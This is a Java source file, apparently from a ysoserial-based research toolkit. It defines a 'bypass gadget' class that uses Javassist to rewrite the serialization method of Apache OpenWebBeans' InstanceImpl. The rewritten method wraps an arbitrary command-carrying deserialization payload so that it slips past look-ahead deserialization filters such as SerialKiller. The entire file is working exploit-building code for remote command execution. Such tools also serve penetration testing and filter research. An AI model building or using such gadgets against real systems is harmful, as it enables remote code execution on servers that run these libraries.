package serialkiller.bypass;

import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import org.apache.webbeans.config.WebBeansContext;
import org.apache.webbeans.context.creational.CreationalContextImpl;
import org.apache.webbeans.inject.instance.InstanceImpl;
import ysoserial.payloads.annotation.Dependencies;

import javax.enterprise.inject.spi.InjectionPoint;
import java.lang.annotation.Annotation;
import java.lang.reflect.Constructor;
import java.lang.reflect.Type;

/**
 * Created by alvaro on 08/04/16.
 */

@Dependencies({ "org.apache.openwebbeans:openwebbeans-impl:1.6.3" })
public class ApacheWebBeans2 implements BypassGadget {

    public Object wrapPayload(String command, Class payload) throws Exception {

        String payload_class = payload.getName();

        ClassPool pool = ClassPool.getDefault();
        CtClass c = pool.get("org.apache.webbeans.inject.instance.InstanceImpl");
        CtMethod writeObject = c.getDeclaredMethod("writeObject");
        String code = "{" +
                "java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream($1);" +
                "java.lang.Object payload = new " + payload_class + "().getObject(\"" + command + "\");" +
                "oos.writeObject(payload);" +
                "oos.flush();" +
                "}";
        writeObject.setBody(code);
        Class instrumentedClass = c.toClass();
        Constructor ctor = instrumentedClass.getConstructor(Type.class, InjectionPoint.class, WebBeansContext.class, CreationalContextImpl.class, (new Annotation[]{}).getClass());
        return (InstanceImpl) ctor.newInstance(null, null, null, null, new Annotation[] {});

    }

    public boolean bypassXStream() { return false; }
    public boolean skipTest() { return false; }
}
